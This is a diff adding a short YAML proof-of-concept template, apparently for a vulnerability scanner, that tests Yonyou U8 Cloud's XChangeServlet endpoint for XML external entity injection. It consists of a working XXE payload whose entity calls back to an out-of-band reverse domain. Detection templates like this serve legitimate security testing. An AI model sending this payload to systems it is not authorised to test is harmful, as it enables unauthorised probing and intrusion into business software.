@@ -1,0 +1,29 @@
+name: poc-yaml-yongyouU8-Cloud_XChangeServlet-XXE
+transport: http
+
+
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /service/XChangeServlet
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Content-Type: text/xml
+      body: '<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://{{reverseDomain}}">]><r><a>&xxe;</a ></r>'
+
+    expression: reverse.wait(1)
+expression: r0()
+
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140286632
+
